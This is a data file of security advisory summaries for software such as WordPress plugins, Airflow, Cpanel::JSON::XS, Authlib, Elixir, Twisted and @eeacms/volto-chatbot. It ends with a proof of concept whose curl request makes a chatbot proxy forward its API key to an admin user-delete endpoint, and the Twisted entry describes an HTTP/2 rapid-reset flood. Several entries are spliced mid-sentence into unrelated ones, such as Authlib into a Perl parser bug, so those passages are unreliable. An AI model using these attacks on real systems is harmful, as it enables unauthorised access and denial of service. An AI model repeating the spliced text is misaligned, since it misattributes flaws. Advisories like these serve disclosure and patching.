items.summary: The Gravity Forms plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.1.2 via a Post Custom Field whose input type is List. This is due to GFFormsModel::create_post() passing the submitted value to WordPress' unrestricted global maybe_unserialize() rather than the plugin's own hardened GFCommon::maybe_unserialize(), which was added in 3.1.1 and passes allowed_classes => false precisely to prevent object instantiation. Where the field has a content template enabled, the submitted row reaches that call verbatim. This makes it possible for unauthenticated attackers to inject a PHP object into post meta. No PHP Object Injection gadget chain is present in the plugin itself; however, if a gadget chain is present via an additional plugin or theme, it could allow the attacker to perform actions such as remote code execution. Where the custom field is mapped to the protected _wp_page_template meta key, WordPress itself supplies the chain: validate_file() accepts non-scalars, WP_Theme::__toString() then resolves an attacker-controlled path, and on hosts with a readable PEAR install and register_argc_argv enabled this yields remote code execution.

items.summary:
Apache Airflow Amazon provider: the AWS auth manager's SAML login flow does not bind the authentication response to the browser that began it. The login handler discards the AuthnRequest ID and the callback validates the assertion without requiring a matching InResponseTo, so an unauthenticated attacker who can cause a victim to load a page can complete a SAML login in the victim's browser using the attacker's own assertion, silently logging the victim into the attacker's Airflow account. Subsequent work the victim performs lands in a session the attacker controls.

Affects deployments using the AWS auth manager with SAML authentication. The victim needs only to visit an attacker-controlled page; no Airflow account or credential is required of the attacker. This is the same login-CSRF class fixed in the Keycloak auth manager as CVE-2026-40948.

Users of apache-airflow-providers-amazon are recommended to upgrade to version 9.38.0, which fixes the issue.

items.summary:
Cpanel::JSON::XS versions before 4.80 for Perl leak the decoded arguments of a tagged value when its THAW method dies in decode_tag.

With allow_tags, a tagged value's class name and argument array are decoded and passed to the class's THAW method. Both are released only after THAW returns, so a THAW that dies leaves the whole decoded argument structure allocated.

Each rejected document leaks data of a size the sender chooses, so a process that catches the error and keeps running exhausts its memory.

items.summary: SOCFortress CoPilot focuses on providing a single pane of glass for all your security operations needs. Prior to 0.1.76, in the reported deployment, case-report templates uploaded by `customer_user`, the lowest-privilege portal role, are later executed by non-sandboxed Jinja2 engines when an admin or analyst generates a report. The `/case-report-template/upload` route in `backend/app/incidents/routes/db_operations.py` validates only the filename-derived MIME type, not the template content. Templates share a global store without customer_code scoping, and `customer_user` can also list, download and delete them, allowing an attacker to replace a legitimate default template under the same name. In `backend/app/incidents/services/reports.py`, `render_document_with_context` uses `DocxTemplate` without a sandbox; in `backend/app/incidents/services/reports_pdf.py`, `render_html_template` uses a non-sandboxed `Environment` without autoescaping. Normal privileged requests to `POST /api/incidents/report/generate-report-docx` or `/generate-report-pdf` therefore evaluate attacker-controlled Jinja expressions as Python on the backend. The reported deployment executes commands as root, exposing all tenants' incident and SIEM data and stored connector credentials. The HTML/PDF wkhtmltopdf renderer additionally permits local-file reads and requests to internal services. This issue is fixed in version 0.1.76.

items.summary:
The Nginx routing configuration for Cloud Controller blocks unauthenticated access to /internal/v4/ and /internal/v5/ endpoints but omits an equivalent deny rule for /internal/v3/. As a result, the staging callback endpoints /internal/v3/staging/:guid/droplet_completed and /internal/v3/staging/:guid/build_completed are reachable from the public API listener without OAuth or mutual TLS.



 



An attacker with a valid build or droplet GUID can submit a forged staging callback, transition a droplet to STAGED, and persist arbitrary process metadata and sidecar data with no associated package or actor. A SpaceAuditor can enumerate GUIDs without write permissions, making this an effective privilege escalation beyond the intended role boundary.

items.summary: The Export and Import Users and Customers plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 2.7.5 via the plugin's own export and re-import workflow. The vulnerability exists because of a CSV escape-character mismatch between the exporter and the importer: class-csvwriter.php writes cells with fputcsv() using PHP's default backslash (\) escape character, while class-csvreader.php parses the same file with fgetcsv() using a double-quote (") as the escape character. As a result, a crafted value stored in a Subscriber's Biographical Info field — containing a backslash-quote sequence followed by a newline — is written as a single quoted CSV field but parsed back as two separate rows on import. The injected second row is then processed by hf_create_customer() as a new user record whose user_login, user_pass, user_email, and role are entirely attacker-controlled, allowing the creation of an arbitrary Administrator account. This makes it possible for authenticated attackers with Subscriber-level access and above to escalate their privileges to Administrator.

items.summary:
Pass-through of unvalidated KMS URLs to KMS clients in Apache C++ Parquet and PyArrow versions 4.0.0 to 25.0.1.




This affects users who read Parquet files and configure Parquet decryption properties with a KmsClient implementation.




On the reader side, the KMS URL can be application-controlled (specified in the KmsConnectionConfig) or file-controlled.
If the user does not leverage application control for this parameter, a file-controlled KMS URL is forwarded to a pluggable KmsClient implementation. 
If the KMS implementation does not perform host validation and makes use of the provided KMS URL, a KMS token can be sent to a malicious host set by an attacker in the file. 




Users are recommended to upgrade to version 26.0.0, which disables this behavior by default and requires that users opt-in to it by enabling the read_kms_url flag in the DecryptionConfiguration. Users of affected versions are recommended to either specify the KMS URL in the KmsConnectionConfig when reading files, or ensure any KmsClient implementations validate received KMS URLs. Users that opt-in to file-controlled KMS URLs in version 26.0.0 and later must ensure KmsClients validate KMS URLs.

Cpanel::JSON::XS versions from 3.0202 before 4.80 for Perl leak memory and retain overloaded objects when encoding values as strings in encode_stringify.

encode_stringify writes a value in its string form under allow_stringify, under convert_blessed for objects without TO_JSON, and under allow_bignum. For an array or hash object with a "" overload, and from 4.20 a scalar object, it takes an extra reference that is never released, so the object and everything it references are never freed. From 4.10 it also never frees its copy of the string.

Repeatedly encoding data that contains such values grows process memory without bound.

items.summary:
Cpanel::JSON::XS versions before 4.80 for Perl use the parent interpreter's scalars from a parser object cloned into a new ithread.

A parser object holds its callbacks and its incremental parse buffer as raw scalar pointers. When a thread is created, these are copied into the new interpreter unchanged, so the child's parser uses, and later frees, scalars that belong to the parent and may already have been freed there.

A parser created before a thread starts and used inside it can call freed callbacks, corrupt reference counts and crash the process.

items.summary:
Cpanel::JSON::XS versions from 4.33 before 4.80 for Perl accept malformed UTF-8 in bare hash keys under allow_barekey in decode_hv.

With utf8 and allow_barekey, which relaxed enables, a quoted key is validated as UTF-8 but a bare key's bytes are stored as a UTF-8 flagged string without any check. Malformed UTF-8, control bytes and backslashes reach the decoded hash, while malformed UTF-8 and control bytes in a quoted key or a value are rejected.

Later operations on the key, including lc, uc or encoding the hash again, die with a malformed UTF-8 error.

items.summary: sigstore-js provides JavaScript libraries for interacting with Sigstore services. Prior to 0.7.2, packages/oci/src/registry.ts contains a RegistryClient.signIn() method that stores registry Authorization and Docker configuration headers as defaults on a shared HTTP client, while RegistryClient.uploadBlob() sends a fresh PUT to an absolute blob-upload Location supplied by the registry without checking that its origin or scheme matches the registry. A malicious or compromised registry can therefore direct a user pushing an artifact through attachArtifactToImage() to an attacker-controlled host and receive the registry bearer token, Basic credentials, or custom authentication headers. Redirect-time header stripping does not prevent the leak because the cross-host PUT is a new explicit request rather than a followed redirect. This is a residual of CVE-2026-59891, whose fix changed credential selection in credentials.ts but did not constrain where credentials are sent from registry.ts. Version 0.7.2 fixes the issue by separating registry credentials from client-wide defaults and sending them only to the registry origin.

items.summary: Authlib is a Python library which builds OAuth and OpenID Connect servers. From 1.3.1 until 1.9.0, OctKey.import_key() checks asymmetric-key markers only at byte zero while Authlib's PEM loaders accept leading whitespace, comments, or a byte-order mark. In deployments that use the documented mixed algorithm registry and already configure verification with PEM or certificate bytes containing such a prefix, an unauthenticated attacker who knows those same public-key bytes can use them as an HMAC secret and forge HS256 tokens with arbitrary identity or authorization claims. This is a bypass of the remediation for CVE-2024-37568. The parser appends each chunk to its buffer. In scalar or list context, it compares max_size with how far it has progressed, not with the buffer length. A chunk that starts with a NUL byte stops the parser before it progresses, and a call in void context skips the check, so the buffer grows without limit.

A peer streaming data to an incr_parse consumer can exhaust process memory regardless of max_size.

items.summary:
Cpanel::JSON::XS versions from 4.28 before 4.80 for Perl leak the array collecting duplicate key values under dupkeys_as_arrayref in decode_hv.

With dupkeys_as_arrayref, the values of a duplicate object key are collected into a new array. An extra reference is never released, so the array and every value in it outlive the decoded structure. The array also leaks when decoding fails after a duplicate key.

Repeatedly decoding untrusted JSON with a duplicate key holding a large value exhausts process memory.

items.summary:
Cpanel::JSON::XS versions before 4.80 for Perl allow memory exhaustion by encoding exponent notation as full decimal digits under allow_bignum.

With allow_bignum, a JSON number with a fraction or exponent decodes to a Math::BigFloat, which stores the exponent separately and so decodes cheaply. Encoding it untyped or as JSON_TYPE_FLOAT writes the plain decimal form with one digit per unit of exponent. Nothing bounds the exponent, so the 12-byte text [1e30000000] encodes to 30 MB.

Untrusted JSON decoded with allow_bignum and encoded again can exhaust memory and CPU.

items.summary:
Cpanel::JSON::XS versions before 4.80 for Perl allow stack exhaustion via nested tagged values under allow_tags in decode_tag.

With allow_tags, "(" starts a tagged value. Its tag and value are decoded recursively, and each can start another tagged value. Unlike arrays and objects, this nesting is not counted against max_depth.

A run of "(" bytes exhausts the C stack and triggers an uncatchable segmentation fault regardless of max_depth.

Cpanel::JSON::XS versions before 4.80 for Perl leak the decoded key of an object rejected for a duplicate key or a missing colon in decode_hv.

A quoted key of 24 or more bytes, or one containing a non-ASCII byte or an escape sequence, is decoded into a new scalar. Nothing frees that scalar when the object is rejected for a missing ':' after the key or, from 4.09, for a duplicate key. Duplicate keys are an error unless allow_dupkeys, dupkeys_as_arrayref or relaxed is set.

A process that keeps running after a failed decode retains one key per rejected document, with its size chosen by the sender. Repeated requests exhaust process memory.

items.summary: Lightdash is an open source business intelligence platform. In affected versions through 0.3213.0, the dbt Cloud webhook `POST /api/v1/projects/{projectUuid}/dbt-cloud/webhook` has no authentication middleware or signature validation. In `packages/backend/src/controllers/projectController.ts`, `testWebhook()` accepts `accountId` and `runId` from a `job.run.completed` request and passes them to `createPreviewWithExplores()` in `packages/backend/src/services/ProjectService/ProjectService.ts`. These unsanitized values are interpolated into the server-side dbt Cloud API URL, which is requested with the victim project's API key in the `Authorization` header. Path traversal through `accountId` changes the requested path on `cloud.getdbt.com` without changing its host, so the credential-bearing request reaches an attacker-influenced path on that fixed host. The advisory claims API-key theft, but the supplied evidence does not establish that the attacker can observe the `Authorization` header. The unauthenticated webhook also allows preview creation. The target must be a `dbt Cloud IDE` project and the attacker must know its `projectUuid`; the UUID is not enumerable but can be discovered in shared or multi-tenant contexts. Version 0.3214.0 fixes identifier path traversal and verifies webhook HMAC signatures only when a secret is configured; without a secret, unsigned webhooks continue to be processed.

items.summary: SD JWT JS is a JavaScript implementation of the Selective Disclosure JWT (SD-JWT) specification. In version 0.19.0 and earlier, `@sd-jwt/decode`, also used by `@sd-jwt/core`, silently drops a tampered Disclosure whose digest no longer matches the Issuer-signed `_sd` array and returns a reduced claim set, reporting success while the Issuer signature remains valid. Both a tampered Disclosure that remains valid JSON and a Disclosure containing invalid UTF-8 bytes reach this silent-drop behavior. In the latter case, the `TextDecoder / Buffer` decoding path substitutes U+FFFD replacement characters, recovering syntactically valid disclosure data instead of rejecting the malformed input. This violates RFC 9901 section 7.1 step 5, which requires rejection of unreferenced Disclosures, and section 7.1 step 3 / section 4.2.1, which require rejection of invalid Disclosures. A malicious holder can exploit this omission primitive, including through `SDJwtInstance.verify()` when key binding is required. An on-path attacker can also tamper with a Disclosure when the relying party does not enforce key binding; enforced key binding rejects on-path tampering because it invalidates the KB-JWT `sd_hash` binding. If the relying party defaults to allowing access when a constraining age, role, or restriction claim is absent, the silent claim reduction can change an authorization decision without an error. This issue is fixed in `@sd-jwt/core` version 0.20.0; no patched version of the standalone `@sd-jwt/decode` package is identified.

items.summary:
Improper Validation of Specified Quantity in Input vulnerability in the Elixir standard library's JSON module allows an unauthenticated attacker who supplies a JSON document to cause a denial of service through CPU and memory exhaustion.

JSON.decode/1 and JSON.decode!/1 convert each integer literal with erlang:binary_to_integer/1 and do not bound its length. A literal of one million digits decodes successfully but costs 100 to 300 times as much CPU as a string of the same length, so one request body of a few megabytes holds a scheduler for about a second. A literal of more than about 1.29 million digits raises SystemLimitError. Applications generated by phx.new decode request bodies with JSON in Plug.Parsers, before routing and authentication.

This issue affects elixir: from 1.18.0-rc.0 before 1.18.6, from 1.19.0-rc.0 before 1.19.7, and from 1.20.0-rc.0 before 1.20.5.

items.summary: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, constructed string and indefinite-length ANY decoding repeatedly concatenates each fragment onto a growing bytes value. Attacker-controlled BER or CER data can use many constructed OCTET STRING or character-string fragments. DER rejects constructed OCTET STRING without a schema, but accepts its definite-length form when asn1Spec selects univ.OctetString; it also accepts constructed character strings such as UTF8String without a schema, even though those encodings are not valid DER. The separate indefinite-length ANY path is reachable in BER and CER when asn1Spec selects univ.Any; DER rejects indefinite lengths. OctetStringPayloadDecoder uses growing header concatenation and AnyPayloadDecoder.indefLenValueDecoder uses growing chunk concatenation, repeatedly copying an increasing prefix and causing quadratic work. A sufficiently fragmented value can occupy decoding workers and cause CPU exhaustion without confidentiality or integrity impact. This issue is fixed in version 0.6.5.

items.summary:
Cpanel::JSON::XS versions before 4.80 for Perl use freed filter callbacks when a filter removes itself during decoding in decode_hv.

A decode copies the parser's filter_json_object and filter_json_single_key_object callbacks without taking references to them. The next object is dispatched through freed memory and can crash the process.

items.summary:
Cpanel::JSON::XS versions from 4.33 before 4.80 for Perl miss duplicate non-ASCII bare keys, allowing type confusion under dupkeys_as_arrayref in decode_hv.

With allow_barekey, which relaxed enables, a bare key containing a non-ASCII byte is stored as UTF-8 but looked up as raw bytes, so a repeated key escapes the duplicate-key check and replaces the earlier value.

From 4.41, under dupkeys_as_arrayref, a bare repeat replaces the array that collects a key's values with a plain value, and the next quoted repeat pushes onto that value as if it were an array. A JSON integer there is dereferenced as a pointer.

Untrusted JSON decoded with relaxed and dupkeys_as_arrayref can crash the process or dereference an address chosen by a JSON number.

items.summary:
Improper Validation of Specified Quantity in Input vulnerability in the Elixir standard library's URI module allows an attacker who supplies a URL to cause a denial of service through CPU exhaustion.

URI.parse/1 converts the port component with String.to_integer/1 in split_authority/1 (lib/elixir/lib/uri.ex) without bounding its length, so a port of up to 1,262,592 decimal digits produces a bignum of that size and a longer one raises SystemLimitError. Rendering the parsed URI back to text (URI.to_string/1, inspect/1, logging, error formatting) converts the bignum with :erlang.integer_to_binary/1, which is quadratic on Erlang/OTP 27, 28 and 29.0: a 400,000-digit port renders in about 2.6 seconds and a 1 MB port in about 18 seconds. Ports above 65535 are also accepted.

This issue affects elixir: from 0.5.0 before 1.18.6, from 1.19.0-rc.0 before 1.19.7, and from 1.20.0-rc.0 before 1.20.5.

items.summary: Botan is a C++ cryptography library. Prior to 3.13.0, Botan's online OCSP client allowed a single HTTP redirect while posting an OCSP request to the URI in a certificate's Authority Information Access extension. A malicious OCSP responder or an on-path attacker could redirect the client to make one blind request to an otherwise unreachable internal HTTP service. items.summary:
In the Linux kernel, the following vulnerability has been resolved:

bpf: Mark sched_process_wait argument as nullable

do_wait() passes wo->wo_pid to the sched_process_wait tracepoint.
kernel_wait4() leaves wo_pid NULL for wait4(-1), and
kernel_waitid_prepare() does likewise for waitid(P_ALL).

btf_ctx_access() currently types argument 0 as PTR_TO_BTF_ID |
PTR_TRUSTED. Without PTR_MAYBE_NULL, the verifier accepts an unchecked
dereference. Trusted pointer loads have no fault protection, so a wait for
any child can then cause a NULL pointer dereference in JITed BPF code.

Add sched_process_wait to raw_tp_null_args[] with argument 0 marked
nullable. The verifier rejects an unchecked dereference while preserving
access after the program checks the pointer for NULL.

items.summary:
Insecure Temporary File vulnerability in Mix deps.partition in Elixir allows a local user to execute code as another user via a swapped partition config file. Partitioned dependency compilation passes the project configuration to each partition VM through a file in a fixed-name directory under the shared system temporary directory, and the partition trusts what it reads back. Another local user on the same host can exploit this during a mix deps.compile run that uses partitioned compilation.

Mix.Tasks.Deps.Partition.server/4 in lib/mix/lib/mix/tasks/deps.partition.ex creates the directory with File.mkdir_p/1, which accepts an existing directory without checking its owner, so a user who created it first can replace the file before client/0 reads it.

This issue affects mix: from 1.20.0-rc.4 before 1.20.5.

items.summary: WeGIA is a web manager for charitable institutions. Prior to 3.8.7, a stored DOM cross-site scripting vulnerability in `web/html/memorando/listar_despachos.php` results from unsafe handling of the `texto` field. The affected flow spans `web/controle/memorando/DespachoControle.php` and `web/dao/memorando/DespachoDAO.php`: `FILTER_SANITIZE_SPECIAL_CHARS` is applied during storage, but `html_entity_decode()` later decodes the stored content and `jQuery .html()` inserts the result into the DOM. An attacker able to submit a memorandum dispatch through `/controle/control.php` using `DespachoControle` and `metodo=incluir` can store malicious HTML or JavaScript. The code executes automatically when another user views the memorandum thread through `/html/memorando/listar_despachos.php` with `id_memorando`. This permits arbitrary JavaScript execution, theft of administrator `PHPSESSID` session tokens, privileged session hijacking, account takeover, and unauthorized access to privileged or internal functionality. This issue is fixed in version 3.8.7.

items.summary: Authlib is a Python library which builds OAuth and OpenID Connect servers. Prior to 1.9.0, OpenIDMixin.parse_id_token() reads the nonce_supported decision from the untrusted ID token being validated and sets the expected nonce to null when that claim is the JSON boolean false. In implicit and hybrid relying parties, or applications that directly accept externally supplied ID tokens, an attacker with a captured validly signed token can bypass the nonce-to-session binding and replay the victim's token into an attacker-controlled session. Plain authorization code flow is not affected, and the token must still pass signature, issuer, and audience validation. OpenIDMixin.parse_id_token() trusts nonce_supported in both authlib/integrations/base_client/sync_openid.py and authlib/integrations/base_client/async_openid.py to disable the expected nonce. This issue is fixed in version 1.9.0.

DNSSEC support is not compiled in by default and must also be enabled at runtime.

A remote attacker can open idle TCP connections to port 53 and occupy the entire pool, preventing new TCP DNS connections and DNSSEC validation that requires TCP fallback. UDP DNS resolution continues, and occupied slots are released after a fixed lifetime.

Due to insufficient sanitization of the From header value, a remote attacker can send a crafted email containing a malicious From header with an embedded JavaScript payload. items.summary: P-Net before 1.0.3 does not check that a complete block header is present in the received data before reading the next block in DCP Set and Identify requests. If the last block ends at the end of the receive buffer, the block length of the following block is read past the end of the buffer. In addition, a DCP Set block with a length smaller than the two-byte block qualifier makes the length underflow, so the block is processed with a length of 65534 bytes. This can cause a crash (denial of service) or disclose a small amount of memory content. Requires ADJACENT network access.

items.summary:
Server-Side Request Forgery (SSRF) vulnerability in Apache Camel A2A component.



This issue affects Apache Camel: from 4.21.0 before 4.22.2.



WebhookUrlValidator classified a push notification webhook host in two places that did not agree. A host written as an IP literal was matched against a list of string prefixes that named the IPv6 unique local range fc00::/7, while a host reached through a name was resolved and the resulting address classified with the InetAddress predicates isLoopbackAddress, isAnyLocalAddress, isLinkLocalAddress and isSiteLocalAddress. Those predicates do not cover the same ground as the prefix list: isSiteLocalAddress reports the deprecated fec0::/10 block and not the fc00::/7 unique local addresses that replaced it, and the JDK carries no predicate for them at all. The same address was therefore accepted or rejected depending on how it was written, and a webhook URL whose host name resolved into fc00::/7 passed a guard that refused the identical address given as a literal. PushNotificationDispatcher then sent the push notification to that address, together with any Authorization header carried in the same configuration, whose scheme and credentials the registering caller supplies. The webhook URL arrives as TaskPushNotificationConfig.url from the caller registering the push notification, so it is attacker-controlled, and allowLocalWebhookUrls is false by default, which is the configuration in which the guard is expected to hold. The response is not relayed back to the caller who registered the configuration, so what the gap yields is a blind outbound HTTPS request from the Camel process to an internal address the guard was written to refuse; reaching a service that way additionally requires that the name resolve into fc00::/7 in the target environment, that an HTTPS service be listening on that address, and that the TLS handshake succeed for the name being requested, which is why the severity is assessed medium. The same string pre-check was also wrong in the other direction: it matched the raw host string without first establishing that the host was an IP literal, so any name merely beginning with fc or fd, such as fcm.googleapis.com, was refused outright.



Users are recommended to upgrade to version 4.23.0, which fixes the issue. If users are on the 4.22.x releases stream, then they are suggested to upgrade to 4.22.2. The 4.21.x release line reached end of life before this issue was resolved and will not receive a fix, so deployments on it must move to a supported release. Both the literal and the resolved path now classify the address from its raw bytes with one shared classifier, which recognises fc00::/7 and the shared address space 100.64.0.0/10, as well as IPv4-compatible, NAT64 (64:ff9b::/96) and 6to4 (2002::/16) addresses whose embedded IPv4 address is not globally routable. For deployments that cannot upgrade immediately, place authentication in front of the A2A push notification configuration path so that the webhook URL does not arrive from an untrusted caller, and deny egress from the Camel process to fc00::/7 at the network level; where the deployment has no need of IPv6, starting the JVM with -Djava.net.preferIPv4Stack=true removes the address class the gap turns on. Note that allowLocalWebhookUrls=false is already the default and does not by itself close the gap.

An external party able to supply a URL to OIDC RP-Initiated Logout registration, authorization-server metadata validation, or another call site can bypass the TLS-required guard and cause cleartext redirection or acceptance of cleartext endpoints. The vulnerable authlib.common.security.is_secure_transport() implementation in authlib/common/security.py misinterprets the userinfo component before OIDC RP-Initiated Logout dynamic client registration and other consumers enforce transport security. This issue is fixed in version 1.8.0.

items.summary:
### Summary
During the resource pack stage of logging in, after the server sends `ResourcePackStackPacket`, a malicious client can send a batch of multiple `ResourcePackClientResponsePacket` packets with status `ResourcePackClientResponsePacket::STATUS_COMPLETED` causing the server to repeatedly execute pre-spawn progression.

###  Impact
Multiple `Player` objects can be created for just a single session, increasing memory usage and amplifying outbound network traffic from duplication of large pre-spawn packets such as `AvailableCommandsPacket` and `CreativeContentPacket`.

### Workarounds
Plugins can use their own `PacketHandler` classes that reject/ignore any extra `ResourcePackClientResponsePacket` packets.

### Patches
This issue was patched in https://github.com/pmmp/PocketMine-MP/commit/7a27894146a04964ab628ed9033140fdbf887ff3 and released in 5.44.2.

items.summary:
## Summary

An uncontrolled-resource-consumption vulnerability (CWE-400) in the Twisted HTTP/2 server lets any unauthenticated remote client exhaust server CPU over a single connection. A client that sends a request header block with `END_STREAM` and then immediately resets the stream makes the server route and render the request before it processes the reset. Reset streams are freed and never count against the concurrent-stream limit, and no reset-rate limiter exists, so the pattern can be repeated at line rate on one connection. This is the HTTP/2 Rapid Reset class, CVE-2023-44487.

## Details

For one received segment the h2 events are processed in order in `H2Connection.dataReceived`. A `HEADERS(END_STREAM)` followed by `RST_STREAM` yields `RequestReceived`, `StreamEnded`, then `StreamReset`, so the request is dispatched and rendered on stream end before the reset is handled:

```python
# src/twisted/web/_http2.py  (H2Connection.dataReceived)
for event in events:
    if isinstance(event, h2.events.RequestReceived):
        self._requestReceived(event)     # allocate the request
    elif isinstance(event, h2.events.StreamEnded):
        self._requestEnded(event)        # -> requestComplete -> render() synchronously
    elif isinstance(event, h2.events.StreamReset):
        self._requestAborted(event)      # processed last, frees the stream
```

`_requestAborted` frees the reset stream, so it never occupies the 100-stream concurrency budget, and nothing in `_http2.py` counts or throttles opened-and-reset streams. The 2019 flood fix (GHSA-32gv) bounds outbound control-frame buffering only and does not apply to this path.

Affected product: Twisted, `twisted.web` HTTP/2 server
Affected versions: confirmed against 26.4.0

## PoC

On any Twisted HTTP/2 endpoint, open one connection and, in a tight loop, send a `HEADERS` frame with `END_STREAM` on a fresh stream identifier immediately followed by a `RST_STREAM` for that stream, at line rate. No credentials are required. The server renders each request on stream end before the reset frees the stream, and a freed stream never counts toward the concurrent-stream limit, so the loop is never throttled.

Because every cancelled stream is still dispatched in full and reset streams do not accumulate, the connection is never throttled or closed, so the forced work grows with the number of pairs sent. Sustained on one connection this saturates a CPU core under only a trickle of traffic, whereas a client that instead leaves its streams open is closed once it reaches the concurrent-stream limit.

## Impact

This is an unauthenticated remote denial of service (CWE-400, CWE-770) by CPU exhaustion. One connection forces unbounded request rendering at a few frames per cancelled request, bypassing the concurrent-stream limit. It is the HTTP/2 Rapid Reset class (CVE-2023-44487), not covered by the earlier Twisted flood fix, with no confidentiality or integrity impact and no code execution.
items.title: Twisted: Unauthenticated Remote Denial of Service in the Twisted HTTP/2 Server via Rapid Stream Reset

items.summary:
## Unauthenticated Danswer API Confused Deputy Proxy in @eeacms/volto-chatbot

### Summary

`@eeacms/volto-chatbot` exposes an Express middleware route (`**/_v1_da/**`) that accepts unauthenticated HTTP requests from any network client and proxies them to the configured upstream Danswer API, automatically attaching the server-side service credentials (`DANSWER_API_KEY` or session cookie). Because no authorization check, path allowlist, or method restriction is applied before the upstream request is issued, an unauthenticated attacker can invoke arbitrary Danswer API operations — including privileged admin endpoints — as the configured service account. This is a classic Confused Deputy attack: the Volto proxy acts as a deputy that carries credentials on behalf of the attacker.

### Details

The vulnerability is introduced across two source files in `@eeacms/volto-chatbot@2.0.3`.

**Route registration (`src/index.js:15`):**

```js
middleware.all('**/_v1_da/**', proxyMiddleware);
```

The wildcard pattern matches every HTTP method and any sub-path, and no authentication middleware is chained before `proxyMiddleware`. This means all requests reaching any `/_v1_da/` path are forwarded without any identity check.

**Unvalidated path extraction and upstream URL construction (`src/middleware.js:228-230`):**

```js
const path = req.url.replace('/_v1_da/', '/');
const reqUrl = `${process.env.DANSWER_URL || ''}/api${path}`;
```

The attacker-controlled `req.url` is transformed into the upstream Danswer path with a simple string replace. There is no allowlist of permitted paths, no restriction on HTTP methods, and no validation of the resulting URL. The attacker therefore fully controls which Danswer endpoint is called and with which HTTP method.

**Credential attachment and forwarding (`src/middleware.js:164`, `src/middleware.js:169`, `src/middleware.js:202`):**

```js
// Session-cookie path (line 164):
headers = { Cookie: cached_auth_cookie, ... }

// API-key path (line 169):
Authorization: 'Bearer ' + api_key,

// Sink — final upstream dispatch (line 202):
const response = await fetch(url, options, req.body);
```

After constructing the URL from attacker-supplied input, the middleware attaches the server-side Danswer credentials (either a cached login session cookie or a `Bearer` API key) and dispatches the request. The response from Danswer is then relayed back to the unauthenticated client.

**Complete data flow (source → sink):**

1. `src/index.js:15` — all `**/_v1_da/**` paths registered to `proxyMiddleware` with no auth guard (source: external HTTP request).
2. `src/middleware.js:228` — `req.url` used directly to derive the upstream path without allowlist.
3. `src/middleware.js:230` — attacker-controlled path appended to `${DANSWER_URL}/api`.
4. `src/middleware.js:164` / `src/middleware.js:169` — server-side session cookie or API key attached.
5. `src/middleware.js:202` — `fetch(url, options, req.body)` sends the fully-credentialed request to the Danswer backend (sink).

This vulnerability is present whenever the add-on middleware is installed and `DANSWER_API_KEY` or `DANSWER_USERNAME`/`DANSWER_PASSWORD` is configured — conditions required for normal, documented operation of the package.

### PoC

The following steps reproduce the vulnerability using the Docker-based test harness provided with this report.

**Prerequisites:**
- Docker installed
- Python 3 with the `requests` library

**Step 1 — Build the Docker image (from the `npmAI_719_eea__volto-chatbot/` parent directory):**

```bash
docker build \
  -f vuln-001/Dockerfile \
  -t vuln001-proxy \
  reports/npmAI_719_eea__volto-chatbot
```

The image packages the unmodified `src/middleware.js` from `@eeacms/volto-chatbot@2.0.3`, a minimal Express server that wires the vulnerable middleware, and an in-container mock Danswer server that echoes every received request as JSON. The environment variable `DANSWER_API_KEY=supersecret` is set to simulate a real deployment.

**Step 2 — Start the container:**

```bash
docker run --rm -d -p 3000:3000 --name vuln001-test vuln001-proxy
```

This launches both the Volto proxy (port 3000) and the mock Danswer server (port 18080) inside the container.

**Step 3 — Run the PoC exploit script:**

```bash
python3 vuln-001/poc.py 127.0.0.1 3000
```

**What the script does:**
1. Waits for the proxy to accept TCP connections.
2. Sends an unauthenticated `POST` request with a JSON body to the admin-only Danswer endpoint via the proxy:

```
POST http://127.0.0.1:3000/_v1_da/admin/users/delete
Content-Type: application/json

{"id": "victim-user-123"}
```

No `Authorization` or `Cookie` header is sent by the client.

**Expected output (exploit confirmed):**

```
[+] === EXPLOIT CONFIRMED — PASS ===
[+] Decisive evidence:
    1. Attacker-controlled path reached upstream : url='/api/admin/users/delete'
    2. Server-side API key forwarded (no client auth) : authorization='Bearer supersecret'
    3. Attacker-controlled HTTP method forwarded : method='POST'
```

The mock Danswer server receives `POST /api/admin/users/delete` with `Authorization: Bearer supersecret` — proving that the attacker controlled both the upstream path and the HTTP method while the server silently attached its own credentials.

**Equivalent manual curl command (without Docker):**

```bash
# Terminal 1 — mock Danswer server
node - <<'NODE'
require('http').createServer((req, res) => {
  let b = ''; req.on('data', c => b += c);
  req.on('end', () => {
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({
      method: req.method, url: req.url,
      authorization: req.headers.authorization || null,
      body: b
    }));
  });
}).listen(18080, () => console.log('mock Danswer on :18080'));
NODE

# Terminal 2 — Volto with Danswer credentials configured
DANSWER_URL=http://127.0.0.1:18080 DANSWER_API_KEY=secret yarn start

# Terminal 3 — unauthenticated exploit request
curl -i -X POST 'http://localhost:3000/_v1_da/admin/users/delete' \
  -H 'Content-Type: application/json' \
  --data '{"id":"victim-user-123"}'
```

The response body will contain `"authorization":"Bearer secret"` and `"url":"/api/admin/users/delete"`, confirming the Confused Deputy.

### Impact

This is a **Confused Deputy / Missing Authorization** vulnerability. The Volto proxy acts as a privileged deputy that forwards attacker-supplied requests to the Danswer backend while silently attaching its own service credentials.

**Who is impacted:**

Any deployment of `@eeacms/volto-chatbot` that:
- has the package's Express middleware installed (default when the add-on is active), AND
- has `DANSWER_API_KEY` or `DANSWER_USERNAME`/`DANSWER_PASSWORD` configured (required for the add-on to function at all).

Because these conditions are satisfied in every normal production deployment of the package, the vulnerability is effectively default-on.

**Concrete attacker capabilities depend on the Danswer service account's permissions but include:**

- **High Confidentiality impact** — reading any Danswer endpoint accessible to the service account, including documents, user data, conversation history, and configuration.
- **Low–High Integrity impact** — invoking write/mutate endpoints such as `POST /admin/users/delete`, `POST /chat/create-chat-session`, or any other writable Danswer API path as the service account.
- **No Authentication required** — the attacker needs only network access to the Volto server (port 3000); no user account, cookie, or token is required.

The vulnerability is exploitable by any unauthenticated network attacker, including anonymous internet users if the Volto server is publicly reachable.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# Dockerfile for VULN-001 PoC — Unauthenticated Danswer API Confused Deputy Proxy
#
# Build context: the parent directory (npmAI_719_eea__volto-chatbot/)
#   docker build -f vuln-001/Dockerfile -t vuln001-proxy .
#
# Run:
#   docker run --rm -p 3000:3000 vuln001-proxy

FROM node:18-alpine

WORKDIR /app

# Install production dependencies required by the vulnerable middleware and test harness
RUN npm init -y && npm install --save \
    express@4 \
    superagent@8 \
    node-fetch@2 \
    debug@4 \
    @babel/core@7 \
    @babel/register@7 \
    @babel/preset-env@7

